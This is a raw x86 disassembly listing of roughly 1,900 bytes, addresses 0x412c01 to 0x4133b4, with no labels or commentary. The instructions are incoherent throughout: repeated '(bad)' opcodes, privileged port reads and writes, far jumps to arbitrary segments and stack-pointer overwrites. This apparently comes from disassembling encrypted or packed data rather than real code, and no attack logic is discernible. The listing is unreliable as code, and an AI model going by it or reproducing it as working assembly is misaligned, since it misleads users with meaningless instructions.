  412c01:	mov    eax,0x5ebf68f7
  412c06:	sub    eax,0xbd2cc287
  412c0b:	pop    esi
  412c0c:	bound  esp,QWORD PTR [edi-0x3b]
  412c0f:	repnz xchg bp,ax
  412c12:	out    0x41,al
  412c14:	repz cmp dl,dl
  412c17:	gs push ss
  412c19:	xchg   ebx,eax
  412c1a:	scas   eax,DWORD PTR es:[edi]
  412c1b:	and    BYTE PTR [esi+esi*4-0x1921b5d2],0xbb
  412c23:	cdq    
  412c24:	out    dx,al
  412c25:	dec    ecx
  412c26:	popa   
  412c27:	clc    
  412c28:	loop   0x412c13
  412c2a:	jmp    0xc599:0xaa74068f
  412c31:	in     al,0x61
  412c33:	ss test edi,0xbae1688f
  412c3a:	sbb    esi,esi
  412c3c:	dec    ebx
  412c3d:	adc    DWORD PTR [edx-0x2c69c359],eax
  412c43:	into   
  412c44:	or     cl,BYTE PTR [ebx+0x5d971995]
  412c4a:	sub    cl,0xec
  412c4d:	fdivr  DWORD PTR [eax-0x1a]
  412c50:	cmp    al,0x31
  412c52:	iret   
  412c53:	cmp    BYTE PTR [edx],dh
  412c55:	cwde   
  412c56:	adc    eax,0xa1d53a3f
  412c5b:	fimul  WORD PTR [ecx]
  412c5d:	add    ch,BYTE PTR [esi-0x7a]
  412c60:	fsubr  QWORD PTR [edi]
  412c62:	or     esi,DWORD PTR [ecx-0x34]
  412c65:	dec    edx
  412c66:	or     bh,ah
  412c68:	call   0xb1d1eeea
  412c6d:	mov    bl,BYTE PTR fs:[ecx-0x28]
  412c71:	cwde   
  412c72:	mov    esp,DWORD PTR [ebp+ecx*4-0x69f56b17]
  412c79:	fucom  st(0)
  412c7b:	popf   
  412c7c:	stos   DWORD PTR es:[edi],eax
  412c7d:	inc    ebp
  412c7e:	cmc    
  412c7f:	or     ebp,esi
  412c81:	adc    al,0xae
  412c83:	jmp    DWORD PTR ds:0xb838c2a2
  412c89:	jg     0x412ccc
  412c8b:	xchg   esp,eax
  412c8c:	mov    eax,ds:0xe869f382
  412c91:	add    dh,BYTE PTR [edx-0x4cc680fe]
  412c97:	loopne 0x412d0d
  412c99:	(bad)  
  412c9a:	in     eax,0xf9
  412c9c:	data16 js 0x412d06
  412c9f:	xor    al,0xb4
  412ca1:	enter  0x694f,0xbf
  412ca5:	aad    0xc8
  412ca7:	inc    esp
  412ca8:	aam    0xcc
  412caa:	xchg   ebp,eax
  412cab:	sub    bl,BYTE PTR [ecx]
  412cad:	aaa    
  412cae:	popf   
  412caf:	dec    eax
  412cb0:	(bad)  
  412cb2:	inc    edx
  412cb3:	and    ecx,DWORD PTR [eax+0x25]
  412cb6:	push   ss
  412cb7:	pop    ecx
  412cb8:	(bad)  
  412cb9:	pop    ds
  412cba:	sbb    al,0x9b
  412cbc:	add    BYTE PTR [eax],al
  412cbe:	add    BYTE PTR [eax],al
  412cc0:	add    BYTE PTR [eax],al
  412cc2:	push   edi
  412cc3:	lea    esp,[ecx+0x7e]
  412cc6:	sti    
  412cc7:	(bad)  
  412cc8:	pop    edi
  412cc9:	lods   eax,DWORD PTR ds:[esi]
  412cca:	into   
  412ccb:	fisttp DWORD PTR [edx+0x58]
  412cce:	gs cld 
  412cd0:	stos   BYTE PTR es:[edi],al
  412cd1:	int3   
  412cd2:	imul   DWORD PTR [edi]
  412cd4:	add    DWORD PTR [eax],eax
  412cd6:	and    al,BYTE PTR [edi]
  412cd8:	add    BYTE PTR [eax],al
  412cda:	out    0x7f,eax
  412cdc:	pop    ebp
  412cdd:	push   cs
  412cde:	push   edx
  412cdf:	adc    dh,ah
  412ce1:	mov    DWORD PTR [esi],ecx
  412ce3:	push   0x4bbc0cfd
  412ce8:	sub    BYTE PTR [eax+0x2188fce2],al
  412cee:	pop    ds
  412cef:	inc    esp
  412cf0:	loope  0x412c7f
  412cf2:	pushf  
  412cf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cf4:	gs jne 0x412cce
  412cf7:	mov    al,0x11
  412cf9:	inc    esi
  412cfa:	fadd   DWORD PTR [edx-0x66]
  412cfd:	call   0xc27:0x31d5d067
  412d04:	jg     0x412d7e
  412d06:	dec    esp
  412d07:	sbb    al,0x8c
  412d09:	jno    0x412cb8
  412d0b:	sub    ebx,DWORD PTR [esp+edi*4]
  412d0e:	mov    gs,WORD PTR [edi]
  412d10:	jns    0x412d20
  412d12:	fs (bad) 
  412d14:	in     eax,dx
  412d15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d16:	cmp    edx,DWORD PTR [eax]
  412d18:	into   
  412d19:	adc    BYTE PTR [ebx+0x69],0xdf
  412d1d:	dec    edi
  412d1e:	mov    edx,0x228ce02f
  412d23:	out    dx,eax
  412d24:	push   ds
  412d25:	sub    bl,BYTE PTR [edx]
  412d27:	push   0xffffff8b
  412d29:	jg     0x412cbc
  412d2b:	sub    cl,al
  412d2d:	inc    ecx
  412d2e:	loopne 0x412d36
  412d30:	sahf   
  412d31:	xor    dh,BYTE PTR [ecx-0x61bad58b]
  412d37:	stc    
  412d38:	adc    ah,bl
  412d3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d3b:	int    0x6d
  412d3d:	cmp    eax,0x9ca216b9
  412d42:	in     al,0xc
  412d44:	scas   eax,DWORD PTR es:[edi]
  412d45:	cli    
  412d46:	ds fcmovu st,st(6)
  412d49:	mov    esp,0x183bada
  412d4e:	or     dl,BYTE PTR [eax+0xd]
  412d51:	mov    ebx,DWORD PTR [esi+0x20]
  412d54:	sahf   
  412d55:	cwde   
  412d56:	or     eax,0xed405a1a
  412d5b:	sbb    DWORD PTR [edi-0x5e796268],0x6befe7ae
  412d65:	mov    al,0xcd
  412d67:	(bad)  
  412d68:	ja     0x412d21
  412d6a:	sbb    BYTE PTR [edx],ah
  412d6c:	lods   al,BYTE PTR fs:[esi]
  412d6e:	mov    BYTE PTR [edi+0x5f],ah
  412d71:	arpl   WORD PTR [esi],sp
  412d73:	sbb    eax,ebx
  412d75:	jns    0x412df0
  412d77:	mov    es,WORD PTR [edi+0x16]
  412d7a:	xor    al,0xb6
  412d7c:	add    BYTE PTR [eax-0x36],0xe5
  412d80:	out    dx,al
  412d81:	jmp    0x332db6a
  412d86:	stos   DWORD PTR es:[edi],eax
  412d87:	outs   dx,BYTE PTR ds:[esi]
  412d88:	pop    DWORD PTR [edx+0x59182dbb]
  412d8e:	rcr    DWORD PTR [edi+eiz*1-0x6d2c354b],0x5c
  412d96:	mov    ds:0x74796509,eax
  412d9b:	lds    eax,FWORD PTR [esi+0x1b]
  412d9e:	popf   
  412d9f:	push   esi
  412da0:	add    DWORD PTR [edx+0x64044506],ecx
  412da6:	out    0xe5,eax
  412da8:	popa   
  412da9:	push   esi
  412daa:	pop    ss
  412dab:	lahf   
  412dac:	xchg   ebx,eax
  412dad:	xchg   esi,eax
  412dae:	xor    BYTE PTR [eax],0x56
  412db1:	sti    
  412db2:	and    edi,edx
  412db4:	mov    ds:0xc6a4b59,eax
  412db9:	pop    edi
  412dba:	mov    ebp,0x6cdadf7b
  412dbf:	sbb    eax,0x3ab19912
  412dc4:	sar    BYTE PTR [eax+0x7c],cl
  412dc7:	xchg   esp,eax
  412dc8:	cmp    eax,0x35a5a668
  412dcd:	js     0x412d66
  412dcf:	sti    
  412dd0:	or     DWORD PTR [eax-0x2a942620],eax
  412dd6:	push   eax
  412dd7:	es xor al,0x5f
  412dda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ddb:	dec    esp
  412ddc:	fcom   DWORD PTR [edi+0x6cf801]
  412de2:	adc    eax,0xdd17d3f0
  412de7:	jnp    0x412e62
  412de9:	xor    BYTE PTR [ebx-0x6d],bl
  412dec:	adc    eax,0xe2f6d67f
  412df1:	(bad)  
  412df2:	in     al,0x71
  412df4:	jnp    0x412de5
  412df6:	ss mov edi,0xac2ba40d
  412dfc:	aad    0xc9
  412dfe:	mov    edx,DWORD PTR [edi+0x47]
  412e01:	sbb    dh,BYTE PTR [ecx-0x6ea6805d]
  412e07:	add    ch,ah
  412e09:	or     DWORD PTR [ebx],edi
  412e0b:	mov    eax,ds:0xf8841721
  412e10:	aas    
  412e11:	dec    esp
  412e12:	lods   al,BYTE PTR ds:[esi]
  412e13:	aad    0xd1
  412e15:	ss sbb esi,ebp
  412e18:	dec    ebp
  412e19:	or     eax,0xd73e57e8
  412e1e:	test   eax,0x3ef35d9b
  412e23:	pop    edi
  412e24:	enter  0x8b15,0x61
  412e28:	push   esp
  412e29:	jl     0x412dcf
  412e2b:	in     al,dx
  412e2c:	in     al,0x95
  412e2e:	push   0xffffffd5
  412e30:	cmp    al,0x91
  412e32:	mov    DWORD PTR [ecx],ecx
  412e34:	cmp    DWORD PTR [esi+0x62849385],edx
  412e3a:	xor    bh,BYTE PTR [edi-0x62]
  412e3d:	inc    ebx
  412e3e:	sub    al,0xff
  412e40:	or     dh,dh
  412e42:	mov    eax,0x815d1fc7
  412e47:	aas    
  412e48:	imul   ebx,DWORD PTR gs:[edx],0x1f
  412e4c:	xor    BYTE PTR [edi-0x739c043f],bh
  412e52:	out    0xe3,al
  412e54:	imul   DWORD PTR [eax-0x76]
  412e57:	bnd jae 0x412e63
  412e5a:	scas   eax,DWORD PTR es:[edi]
  412e5b:	or     DWORD PTR [edx-0x495fb8d7],eax
  412e61:	jp     0x412eb4
  412e63:	aas    
  412e64:	fldenv [ebx+0x69144bc9]
  412e6a:	dec    edi
  412e6b:	dec    edx
  412e6c:	pop    ebp
  412e6d:	scas   eax,DWORD PTR es:[edi]
  412e6e:	imul   ebp,DWORD PTR [edx+ecx*8],0x874dcd9
  412e75:	add    dh,cl
  412e77:	cmp    edi,DWORD PTR [ecx+ebp*2]
  412e7a:	mov    cl,0x35
  412e7c:	mov    bl,0xb3
  412e7e:	jge    0x412ec9
  412e80:	xor    DWORD PTR [ecx-0x740912a8],0xb771f605
  412e8a:	mov    eax,ds:0xcf6a7148
  412e8f:	rcr    ch,1
  412e91:	imul   edx,DWORD PTR [edx],0x6e
  412e94:	addr16 inc ebp
  412e96:	rcl    DWORD PTR [esi-0x53ca18e3],0x76
  412e9d:	fst    DWORD PTR [ecx]
  412e9f:	dec    edx
  412ea0:	sbb    eax,eax
  412ea2:	push   cs
  412ea3:	mov    BYTE PTR [ebp-0x8fd99e6],bl
  412ea9:	push   eax
  412eaa:	sub    BYTE PTR [esi],bl
  412eac:	push   0x6a5f64c0
  412eb1:	pop    esp
  412eb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412eb3:	cld    
  412eb4:	cmp    eax,0x32d33f4e
  412eb9:	aaa    
  412eba:	mov    dl,0x54
  412ebc:	imul   ebx,DWORD PTR ds:0x72ea990e,0xffffffa4
  412ec3:	test   DWORD PTR [edx],ebp
  412ec5:	mov    bh,0xf3
  412ec7:	fisttp WORD PTR [eax-0x41640703]
  412ecd:	sbb    bh,bh
  412ecf:	popf   
  412ed0:	sbb    BYTE PTR [esi+0x66a85c68],bh
  412ed6:	es rcr bh,cl
  412ed9:	fnstcw WORD PTR [edx+ebp*8+0x681d6391]
  412ee0:	rcl    DWORD PTR [edx+edx*1+0xb30839c],cl
  412ee7:	xor    esp,DWORD PTR [edx+eiz*2+0x56b8f819]
  412eee:	ins    BYTE PTR es:[edi],dx
  412eef:	push   edx
  412ef0:	mov    ah,0x8a
  412ef2:	mov    ch,0xe
  412ef4:	or     eax,0xaadb10b7
  412ef9:	and    eax,0xbaa056ca
  412efe:	sti    
  412eff:	dec    eax
  412f00:	scas   eax,DWORD PTR es:[edi]
  412f01:	add    edi,DWORD PTR [ecx+0x1b]
  412f04:	jmp    DWORD PTR [ebx]
  412f06:	fcomp  QWORD PTR [edi+0x3b]
  412f09:	test   eax,0xff65ae30
  412f0e:	out    dx,eax
  412f0f:	retf   0x9fa9
  412f12:	inc    edi
  412f13:	mov    ecx,0x6bf01de3
  412f18:	jl     0x412e9e
  412f1a:	jg     0x412ea0
  412f1c:	dec    ebx
  412f1d:	or     ah,BYTE PTR [eax]
  412f1f:	shr    dl,1
  412f21:	sub    BYTE PTR [edi+0x6b],dl
  412f24:	call   0x62b4853d
  412f29:	test   ecx,eax
  412f2b:	push   cs
  412f2c:	es pop ss
  412f2e:	gs jecxz 0x412ef7
  412f31:	and    DWORD PTR [esi+0x4e7a3124],ebp
  412f37:	push   ebx
  412f38:	jle    0x412f73
  412f3a:	sbb    BYTE PTR [ecx+edx*8+0x2e],ah
  412f3e:	xchg   edi,eax
  412f3f:	pop    esi
  412f40:	xchg   edi,eax
  412f41:	xchg   ecx,eax
  412f42:	popf   
  412f43:	not    bh
  412f45:	(bad)
  412f48:	pop    esp
  412f49:	dec    edi
  412f4a:	cdq    
  412f4b:	mov    ch,BYTE PTR [esi+0x1d]
  412f4e:	scas   al,BYTE PTR es:[edi]
  412f4f:	iret   
  412f50:	sbb    eax,0xa6c9f691
  412f55:	add    DWORD PTR [esp+edi*2],edx
  412f58:	pusha  
  412f59:	xchg   edx,eax
  412f5a:	mov    al,ds:0x3890af8b
  412f5f:	jecxz  0x412fa0
  412f61:	mov    cs,WORD PTR [edi+ebx*8+0x14376a23]
  412f68:	mov    BYTE PTR [ebx],bh
  412f6a:	sahf   
  412f6b:	xchg   esi,eax
  412f6c:	cmp    edx,esi
  412f6e:	and    al,0xff
  412f70:	sub    eax,0xab705bcf
  412f75:	mov    eax,0x3d8cf0a1
  412f7a:	jae    0x412f15
  412f7c:	mov    DWORD PTR [edx+0x38],ecx
  412f7f:	fistp  DWORD PTR [esi+0x45db440e]
  412f85:	jge    0x413005
  412f87:	stc    
  412f88:	cmp    eax,0xa25e92bc
  412f8d:	lea    esi,[eax+ebp*8]
  412f90:	push   ss
  412f91:	mov    bh,0x76
  412f93:	ins    DWORD PTR es:[edi],dx
  412f94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f95:	xchg   ebx,eax
  412f96:	hlt    
  412f97:	xor    esi,DWORD PTR [ecx+ebp*1]
  412f9a:	mov    esp,esi
  412f9c:	jnp    0x412ffe
  412f9e:	or     eax,0x52e1adab
  412fa3:	cmc    
  412fa4:	pop    edx
  412fa5:	inc    ebx
  412fa6:	(bad)  
  412fa7:	jbe    0x41300a
  412fa9:	(bad)  
  412faa:	xlat   BYTE PTR ds:[ebx]
  412fab:	mov    esi,0xa99b29b6
  412fb0:	cmc    
  412fb1:	into   
  412fb2:	jmp    0xd089641e
  412fb7:	or     eax,0xe61fa1bb
  412fbc:	sub    ebx,ebp
  412fbe:	xchg   DWORD PTR [edi],ecx
  412fc0:	mov    BYTE PTR [ebx-0x2591ae27],ch
  412fc6:	xor    al,0x9c
  412fc8:	sub    al,0xbb
  412fca:	mov    ch,0x75
  412fcc:	sub    eax,0xca195573
  412fd1:	mov    BYTE PTR [esi+0x7fbad73],bl
  412fd7:	mov    ebp,0xffb97246
  412fdc:	mov    dl,BYTE PTR [esi-0x7b94a74f]
  412fe2:	sbb    DWORD PTR [esi],0x3a
  412fe5:	adc    dh,BYTE PTR [edx-0x1d5ff894]
  412feb:	or     edi,ebp
  412fed:	mov    esp,0x2f87793b
  412ff2:	mov    ecx,0x85b6f570
  412ff7:	clc    
  412ff8:	sar    DWORD PTR [ecx+0x31],0xb8
  412ffc:	loop   0x413038
  412ffe:	stos   BYTE PTR es:[edi],al
  412fff:	adc    dl,0xd8
  413002:	dec    ebp
  413003:	inc    eax
  413004:	xor    BYTE PTR [eax],al
  413006:	ficom  DWORD PTR [edx]
  413008:	popf   
  413009:	cwde   
  41300a:	dec    esi
  41300b:	push   eax
  41300c:	in     eax,0x18
  41300e:	mov    dl,0x39
  413010:	inc    esp
  413011:	cmp    al,0x95
  413013:	call   0xe4f2:0x266d3abd
  41301a:	shl    BYTE PTR [edx-0xa],cl
  41301d:	popa   
  41301e:	(bad)  
  413020:	jg     0x413048
  413022:	jp     0x41305c
  413024:	lock sbb eax,esp
  413027:	jo     0x413064
  413029:	mov    ebx,0x20142f7a
  41302e:	push   edx
  41302f:	(bad)  
  413030:	fs test eax,0x6bd1a5a1
  413036:	sbb    dl,BYTE PTR [edi+eiz*4]
  413039:	ret    
  41303a:	jge    0x41302c
  41303c:	in     al,dx
  41303d:	mov    bl,0xd9
  41303f:	lods   al,BYTE PTR ds:[esi]
  413040:	fiadd  DWORD PTR [ecx-0x1d]
  413043:	shl    dh,0xde
  413046:	mov    cl,0xcc
  413048:	xchg   esp,eax
  413049:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41304a:	xchg   DWORD PTR [edx-0x28],edx
  41304d:	ins    DWORD PTR es:[edi],dx
  41304e:	xchg   ebp,eax
  41304f:	mov    eax,0x59493458
  413054:	push   ecx
  413055:	inc    ebp
  413056:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413057:	sub    ebx,DWORD PTR [ecx+0x54]
  41305a:	pop    es
  41305b:	sub    DWORD PTR [edi],edx
  41305d:	sub    DWORD PTR [eax],0x72
  413060:	inc    esi
  413061:	jns    0x41303c
  413063:	fwait
  413064:	adc    BYTE PTR [eax*1+0x1e79fda2],bh
  41306b:	xchg   ebx,eax
  41306c:	stos   DWORD PTR es:[edi],eax
  41306d:	jge    0x413054
  41306f:	dec    esi
  413070:	das    
  413071:	pop    eax
  413072:	jl     0x413077
  413074:	or     ebx,DWORD PTR [eax]
  413076:	adc    bh,BYTE PTR [ebx+0x76]
  413079:	pop    edx
  41307a:	push   edi
  41307b:	leave  
  41307c:	dec    ebp
  41307d:	xchg   ecx,eax
  41307e:	jns    0x413096
  413080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413081:	cmp    BYTE PTR [ebx+0x334eaa9a],ah
  413087:	stos   DWORD PTR es:[edi],eax
  413088:	sub    DWORD PTR [ebx-0x23ec9a36],ebx
  41308e:	outs   dx,DWORD PTR ss:[esi]
  413090:	js     0x413101
  413092:	adc    edi,esp
  413094:	inc    eax
  413095:	aad    0x88
  413097:	mov    ds:0xc776bb8d,al
  41309c:	push   esp
  41309d:	mov    al,ds:0x8deda6d7
  4130a2:	aam    0x1d
  4130a4:	xchg   esp,eax
  4130a5:	aam    0x74
  4130a7:	pop    esp
  4130a8:	ja     0x4130c4
  4130aa:	pop    esp
  4130ab:	xor    BYTE PTR [ebp-0x56],bl
  4130ae:	imul   WORD PTR [ebx-0x46]
  4130b2:	ret    0x1472
  4130b5:	out    0xdb,al
  4130b7:	mov    DWORD PTR [edx],esp
  4130b9:	aad    0xe8
  4130bb:	inc    esp
  4130bc:	push   edi
  4130bd:	sbb    edi,DWORD PTR [eax-0x5d]
  4130c0:	pop    esi
  4130c1:	lods   al,BYTE PTR ds:[esi]
  4130c2:	mov    eax,0x1a46733f
  4130c7:	fwait
  4130c8:	mov    eax,0x9c075c9d
  4130cd:	out    0x72,eax
  4130cf:	mov    WORD PTR [eax],gs
  4130d1:	push   esp
  4130d2:	sbb    eax,DWORD PTR [edi-0x2b6c55d2]
  4130d8:	jae    0x4130c6
  4130da:	test   ecx,eax
  4130dc:	inc    eax
  4130dd:	push   ss
  4130de:	jne    0x41315e
  4130e0:	adc    ebx,edi
  4130e2:	or     eax,0x3c353d5c
  4130e7:	dec    ecx
  4130e8:	neg    DWORD PTR [ebp*4-0xc3782fe]
  4130ef:	ret    
  4130f0:	or     al,0x88
  4130f2:	jno    0x41309d
  4130f4:	ins    BYTE PTR es:[edi],dx
  4130f5:	dec    ecx
  4130f6:	mov    bl,0x90
  4130f8:	sbb    ah,BYTE PTR [ecx+0x1d44d0f4]
  4130fe:	fild   QWORD PTR [edi]
  413100:	div    DWORD PTR es:[esi-0x3f]
  413104:	call   0x812082e1
  413109:	sbb    eax,0x6ac1d5c0
  41310e:	add    dh,BYTE PTR [edx]
  413110:	and    BYTE PTR [edi+edx*4-0x4b5944c2],ah
  413117:	mov    dh,0xb0
  413119:	fidiv  DWORD PTR [edx+0x6a]
  41311c:	mov    eax,0xb81d31a8
  413121:	inc    esi
  413122:	jnp    0x4130e4
  413124:	rol    DWORD PTR [eax+0x2b],cl
  413127:	mov    ebx,0xdcfea829
  41312c:	xchg   DWORD PTR [ecx+0x1f],ecx
  41312f:	jns    0x41316e
  413131:	aam    0x8e
  413133:	push   esp
  413134:	mov    esi,0x3865e3aa
  413139:	push   cs
  41313a:	int    0x1c
  41313c:	cli    
  41313d:	push   esi
  41313e:	jo     0x4130ec
  413140:	or     al,0x67
  413142:	repz jb 0x413161
  413145:	push   es
  413146:	mov    al,0x8c
  413148:	test   eax,0x5522bc62
  41314d:	repnz sbb eax,0xc252816
  413153:	lahf   
  413154:	je     0x413136
  413156:	add    ch,0xe1
  413159:	sub    eax,0x6fa823ad
  41315e:	mov    ecx,0xeb4b2f82
  413163:	and    BYTE PTR [edx-0x6278d437],bh
  413169:	outs   dx,BYTE PTR ds:[esi]
  41316a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41316b:	sub    BYTE PTR [ebx],dh
  41316d:	fisubr WORD PTR [eax+esi*4]
  413170:	ret    
  413171:	repz neg BYTE PTR [ebx+0x48]
  413175:	retf   0x6018
  413178:	lods   eax,DWORD PTR ds:[esi]
  413179:	sahf   
  41317a:	cwde   
  41317b:	mov    al,ds:0xc2175b86
  413180:	lock aam 0x85
  413183:	pushf  
  413184:	fdiv   QWORD PTR [ecx-0x111c4e48]
  41318a:	jp     0x4131ce
  41318c:	clc    
  41318d:	hlt    
  41318e:	aam    0x5d
  413190:	out    dx,eax
  413191:	fwait
  413192:	sbb    ecx,DWORD PTR [ecx+edi*2-0x259f8625]
  413199:	push   0x53
  41319b:	mov    BYTE PTR [esp+edi*1+0x6a],dl
  41319f:	adc    eax,0xc9910be2
  4131a4:	daa    
  4131a5:	add    edi,DWORD PTR [ebp-0x26]
  4131a8:	(bad)  
  4131a9:	test   BYTE PTR [esi-0x71],0xd0
  4131ad:	lods   al,BYTE PTR ds:[esi]
  4131ae:	ror    DWORD PTR [edi+0x1f],1
  4131b1:	and    dl,ch
  4131b3:	int3   
  4131b4:	mov    WORD PTR fs:[edi+0x74],ds
  4131b8:	cdq    
  4131b9:	mov    cl,0x6a
  4131bb:	stos   DWORD PTR es:[edi],eax
  4131bc:	retf   0x54db
  4131bf:	pop    eax
  4131c0:	xlat   BYTE PTR ds:[ebx]
  4131c1:	cli    
  4131c2:	dec    ebp
  4131c3:	(bad)  
  4131c4:	pushf  
  4131c5:	int3   
  4131c6:	mov    al,0xc1
  4131c8:	and    esp,0xffffffbc
  4131cb:	into   
  4131cc:	jbe    0x4131f7
  4131ce:	cdq    
  4131cf:	fwait
  4131d0:	shr    BYTE PTR [eax-0x539ed491],1
  4131d6:	cs mov esp,0x459e5ba9
  4131dc:	jl     0x413161
  4131de:	xchg   esi,eax
  4131df:	cdq    
  4131e0:	push   0xd35eb156
  4131e5:	sub    ecx,edi
  4131e7:	retf   
  4131e8:	inc    ebx
  4131e9:	adc    esi,DWORD PTR [ecx]
  4131eb:	jne    0x4131a9
  4131ed:	mov    al,0x2
  4131ef:	inc    esi
  4131f0:	inc    ecx
  4131f1:	mov    BYTE PTR [ebx],bl
  4131f3:	leave  
  4131f4:	lods   al,BYTE PTR ds:[esi]
  4131f5:	xchg   edi,eax
  4131f6:	in     al,dx
  4131f7:	sub    BYTE PTR [eax],0xc4
  4131fa:	cmp    DWORD PTR [eax],edx
  4131fc:	in     al,0x51
  4131fe:	mov    ch,0x3a
  413200:	repz or ch,ch
  413203:	dec    esi
  413204:	push   ebx
  413205:	or     al,0x37
  413207:	inc    edx
  413208:	dec    edx
  413209:	mov    ebp,0x7c937ebb
  41320e:	mov    edx,0x526c5a1e
  413213:	xchg   ebx,eax
  413214:	xchg   esi,eax
  413215:	stos   BYTE PTR es:[edi],al
  413216:	call   0xdccb:0x5268bad
  41321d:	adc    esp,DWORD PTR [ebx*8-0x78a4a665]
  413224:	push   es
  413225:	push   ds
  413226:	push   edx
  413227:	lea    ebp,[ebx+0x3354fea4]
  41322d:	test   BYTE PTR [ebp+0x51],0x32
  413231:	jl     0x413257
  413233:	clc    
  413234:	dec    esp
  413235:	lds    edx,FWORD PTR [eax+0x3c]
  413238:	(bad)  
  413239:	or     edi,edi
  41323b:	jnp    0x4131e1
  41323d:	rol    ch,cl
  41323f:	jecxz  0x4131d0
  413241:	loopne 0x4131c4
  413243:	cwde   
  413244:	sti    
  413245:	je     0x41320c
  413247:	dec    eax
  413248:	push   ds
  413249:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41324a:	ret    0xd2a1
  41324d:	xchg   esp,eax
  41324e:	mov    BYTE PTR [ebp-0x7c],al
  413251:	loop   0x413245
  413253:	add    eax,0x6edf7e4b
  413258:	sub    eax,DWORD PTR [ebp*1+0x68274e0f]
  41325f:	call   0x6f71:0x2ca696a9
  413266:	xchg   edi,eax
  413267:	mov    ah,0x18
  413269:	shr    DWORD PTR [ebp-0x7a],1
  41326c:	call   0x8249ddd
  413271:	aam    0x9c
  413273:	push   ebp
  413274:	or     edi,DWORD PTR [eax+0x1a]
  413277:	nop
  413278:	mov    esi,0x84a4d8e3
  41327d:	mov    ch,0x19
  41327f:	push   eax
  413280:	cmp    BYTE PTR [edi-0x1f483909],ch
  413286:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413287:	xchg   ebp,eax
  413288:	mov    edi,0x18890ba6
  41328d:	xor    ebp,ecx
  41328f:	mov    ebp,0x6b7893d3
  413294:	fs lahf 
  413296:	fs sbb al,0xf0
  413299:	and    bl,bh
  41329b:	and    al,0xab
  41329d:	cmp    al,0x2d
  41329f:	lock inc edx
  4132a1:	mov    ecx,0x52ecdbd3
  4132a6:	fnstenv [ebx+0x66]
  4132a9:	xchg   al,dh
  4132ab:	mov    eax,0xebc7ca61
  4132b0:	push   ds
  4132b1:	sub    esp,0xffffffe3
  4132b4:	jecxz  0x4132d7
  4132b6:	push   ss
  4132b7:	xchg   cx,ax
  4132b9:	popa   
  4132ba:	arpl   cx,dx
  4132bc:	sub    DWORD PTR [edx],0xffffffa8
  4132bf:	jb     0x413256
  4132c1:	mov    esi,0x2cf7e220
  4132c6:	out    0xd7,al
  4132c8:	xchg   ecx,eax
  4132c9:	pop    ds
  4132ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132cb:	push   esi
  4132cc:	sbb    DWORD PTR [eax],esi
  4132ce:	xchg   ebp,eax
  4132cf:	lahf   
  4132d0:	cdq    
  4132d1:	outs   dx,DWORD PTR ds:[esi]
  4132d2:	and    DWORD PTR [ecx+0x26],0xffffffc8
  4132d6:	imul   esi,DWORD PTR [edi-0x4e],0xffffff97
  4132da:	mov    al,ds:0xf8d63b5c
  4132df:	and    eax,0xa756920
  4132e4:	cmp    cl,BYTE PTR [esi+0x3876c44b]
  4132ea:	cwde   
  4132eb:	fwait
  4132ec:	sbb    eax,ebp
  4132ee:	mov    al,ds:0xd6591472
  4132f3:	cdq    
  4132f4:	fnstenv [ebx-0x25]
  4132f7:	jb     0x413336
  4132f9:	jo     0x4132e5
  4132fb:	test   BYTE PTR [eax+ebx*4+0x3070d3b9],dh
  413302:	push   ecx
  413303:	mov    esi,DWORD PTR [ebx+0x2c007420]
  413309:	pop    ebx
  41330a:	lods   eax,DWORD PTR ds:[esi]
  41330b:	and    ebx,edx
  41330d:	and    eax,0x9cb876ea
  413312:	out    dx,eax
  413313:	sub    BYTE PTR [ebx+0x79c9172],bl
  413319:	lods   al,BYTE PTR ds:[esi]
  41331a:	push   0x542ddc86
  41331f:	stc    
  413320:	sahf   
  413321:	mov    edi,0xa4b28461
  413326:	mov    esp,0xa6647c8b
  41332b:	sar    BYTE PTR [edi-0x2dabed71],1
  413331:	push   ds
  413332:	retf   0x6d01
  413335:	scas   eax,DWORD PTR es:[edi]
  413336:	ret    0xa070
  413339:	ja     0x4132d9
  41333b:	in     eax,dx
  41333c:	arpl   WORD PTR [ecx-0x79],dx
  41333f:	repnz test DWORD PTR [ecx+0x444991d4],0xfe7b85e2
  41334a:	cmp    DWORD PTR [ebp+0x34],eax
  41334d:	mov    dh,0xca
  41334f:	scas   al,BYTE PTR es:[edi]
  413350:	push   eax
  413351:	push   edx
  413352:	xor    al,0x7b
  413354:	fimul  DWORD PTR [eax]
  413356:	sub    ah,BYTE PTR [ebx]
  413358:	call   DWORD PTR [ebx-0x495731ea]
  41335e:	sub    cl,cl
  413360:	jecxz  0x4133cc
  413362:	or     DWORD PTR [ebp-0x27],0x61fab692
  413369:	repz sub edi,ecx
  41336c:	cmp    eax,0x352b62b4
  413371:	cmp    eax,0x7663988f
  413376:	sbb    DWORD PTR [edi-0x31],esp
  413379:	pop    ss
  41337a:	stos   BYTE PTR es:[edi],al
  41337b:	(bad)  
  41337c:	xchg   esp,eax
  41337d:	jle    0x4133b5
  41337f:	ds pusha 
  413381:	mov    cl,BYTE PTR [esi]
  413383:	jge    0x4133e3
  413385:	pop    ebp
  413386:	xor    ah,BYTE PTR [eax]
  413388:	inc    esp
  413389:	jns    0x413379
  41338b:	leave  
  41338c:	push   esp
  41338d:	cmc    
  41338e:	ins    BYTE PTR es:[edi],dx
  41338f:	js     0x41335b
  413391:	xchg   esp,eax
  413392:	inc    esp
  413393:	adc    BYTE PTR [edi+ebp*8+0x0],0x64
  413398:	call   0x99bca93e
  41339d:	jno    0x4133e5
  41339f:	scas   al,BYTE PTR es:[edi]
  4133a0:	loop   0x413416
  4133a2:	mov    esp,0xf7d82d65
  4133a7:	ret    
  4133a8:	pop    ebx
  4133a9:	mov    cs,WORD PTR [esi+0x5764ea71]
  4133af:	fs jle 0x4133cf
  4133b2:	aad    0x70
  4133b4:	in     eax,dx
